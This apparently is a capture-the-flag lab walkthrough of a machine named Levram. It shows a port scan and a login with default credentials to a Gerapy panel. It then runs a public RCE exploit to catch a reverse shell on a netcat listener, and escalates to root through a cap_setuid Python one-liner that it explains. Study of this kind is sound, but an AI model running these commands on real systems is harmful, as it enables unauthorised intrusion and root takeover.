@@ -1,0 +1,53 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.221.24 > Levram.txt
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
+|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
+8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
+|_http-cors: GET POST PUT DELETE OPTIONS PATCH
+| http-methods: 
+|_  Supported Methods: GET OPTIONS
+|_http-title: Gerapy
+|_http-server-header: WSGIServer/0.2 CPython/3.10.6
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+go 8080 login page, use default admin:admin to login.
+$ searchsploit Gerapy    
+------------------------------------------------------- ---------------------------------
+ Exploit Title                                         |  Path
+------------------------------------------------------- ---------------------------------
+Gerapy 0.9.7 - Remote Code Execution (RCE) (Authentica | python/remote/50640.py
+------------------------------------------------------- ---------------------------------
+
+Add Project name "test", then run 
+$ python3 50640.py -t 192.168.221.24 -p 8000 -L 192.168.45.238 -P 4444
+$ rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.238] from (UNKNOWN) [192.168.221.24] 55016
+bash: cannot set terminal process group (846): Inappropriate ioctl for device
+bash: no job control in this shell
+app@ubuntu:~/gerapy$ id
+id
+uid=1000(app) gid=1000(app) groups=1000(app)
+
+app@ubuntu:/$ getcap -r / 2>/dev/null
+/usr/bin/python3.10 cap_setuid=ep
+app@ubuntu:/$ python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+id
+uid=0(root) gid=1000(app) groups=1000(app)
+
+#####################################################################################
+Key learning:
+getcap -r / 2>/dev/null
+looking for a specific intersection: A powerful capability + A binary that allows execution of arbitrary code.
+cap_setuid (python3.10): This is the Red Flag. cap_setuid allows a process to change its User ID (UID) to any value. 
+Because Python is an interpreter that lets you run any code you want, you can tell it to use that power to become UID 0 (root).
+
+python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+import os: Imports the operating system interface.
+os.setuid(0): This is the critical step. It tells the kernel to change the current process's UID to 0 (Root).
+os.system("/bin/bash"): Spawns a new bash shell. Since the process is now running as UID 0, the shell will be a root shell.
+
+
